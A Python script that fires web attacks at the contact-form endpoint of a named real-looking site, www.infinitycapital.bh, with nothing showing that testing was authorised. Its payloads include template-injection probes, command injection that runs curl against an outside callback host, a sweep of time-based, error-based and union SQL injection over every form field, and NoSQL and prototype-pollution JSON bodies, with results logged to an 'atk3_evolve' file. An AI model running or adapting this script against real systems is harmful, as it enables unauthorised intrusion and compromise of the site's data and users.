import subprocess, urllib.parse, json, sys, time, os
H = ".".join(["www","infinitycapital","bh"])
B = "https://" + H
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
LOG = open(os.path.join(os.environ.get("WORK_PATH","."),"atk3_evolve.log"),"a")

def post(data, hdrs=None, ct="application/x-www-form-urlencoded", out="/tmp/a2.bin"):
    cmd = ["curl","-sk","-X","POST","-A",UA,"-D","/tmp/a2.h","-o",out,"-w","%{http_code} %{size_download} %{content_type}"]
    for h in (hdrs or []): cmd += ["-H",h]
    if ct: cmd += ["-H","Content-Type: "+ct]
    cmd += ["--data-binary", data, B+"/api/send"]
    subprocess.run(cmd, capture_output=True, text=True)
    hdr = open("/tmp/a2.h").read()
    body = open(out,"rb").read()
    return hdr.split("\n")[0].strip(), hdr, body

def form(f):
    return "&".join("%s=%s"%(k,urllib.parse.quote(str(v),safe="")) for k,v in f.items())

def rec(label, st, hdr, body):
    line = "### %s\nSTATUS: %s\nBODY: %r\n" % (label, st, body[:500])
    print(line)
    LOG.write(line); LOG.flush()
    time.sleep(2.5)

def run(hosts):
    sq, cm, ss, ns = hosts
    base = lambda: {"fname":"Test","lname":"QA","areacode":"973","tel":"5551234",
            "cname":"QA Tester","subject":"Hello there","msg":"Testing body",
            "check":"on","targets":"probe@pentest-activator.invalid"}

    f = base(); f["subject"] = "{{7*7}} ${7*7} <%= 7*7 %> #{7*7} {7*7}"
    f["msg"] = "{{7*7}} ${7*7} <%=7*7%> INJ{{marker"
    rec("SSTI-subject-msg", *post(form(f)))

    cb = "http://" + cm + "/cmdi"
    f = base(); f["msg"] = "x; curl " + cb + "; $(curl "+cb+") `curl "+cb+"`"
    f["cname"] = "; curl " + cb + "/cn; #"
    rec("CMDI-msg-cname", *post(form(f)))

    sqli_variants = [
      "1' AND (SELECT 1 FROM (SELECT(SLEEP(6)))a)-- -",
      "1\"; WAITFOR DELAY '0:0:6'-- -",
      "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- -",
      "1; SELECT pg_sleep(6)-- -",
      "1' UNION SELECT 1,2,3-- -",
      "1' OR 1=1-- -",
    ]
    for pname in ["fname","lname","cname","subject","msg","areacode","tel","targets","check"]:
        for pv in sqli_variants:
            f = base(); f[pname] = pv
            t0=time.time(); st,h,b = post(form(f)); el=time.time()-t0
            LOG.write("SQLI %-9s :: %-58r -> %s %.1fs %r\n" % (pname, pv[:56], st, el, b[:160]))
            LOG.flush()
            time.sleep(1.5)
    print("SQLI sweep done")

    nosql_bodies = [
      {"to":{"$gt":""},"subject":"x","text":"y"},
      {"to":["a"],"subject":{"$ne":None},"text":"y"},
      {"$where":"1==1"},
      {"to":"a","subject":"x","text":"y","__proto__":{"polluted":True}},
      {"to":"a","subject":"x","text":"y","constructor":{"prototype":{"polluted":True}}},
      {"to":"a","subject":"x","text":"y","email":"probe@"+ns},
    ]
    for nb in nosql_bodies:
        rec("NOSQLI-json %s" % json.dumps(nb)[:70], *post(json.dumps(nb), ct="application/json"))
        if isinstance(nb, dict):
            flat = {k:(json.dumps(v) if isinstance(v,(dict,list)) else v) for k,v in nb.items()}
            rec("NOSQLI-form %s" % json.dumps(nb)[:60], *post(form(flat)))

if __name__ == "__main__":
    run(sys.argv[1:5])
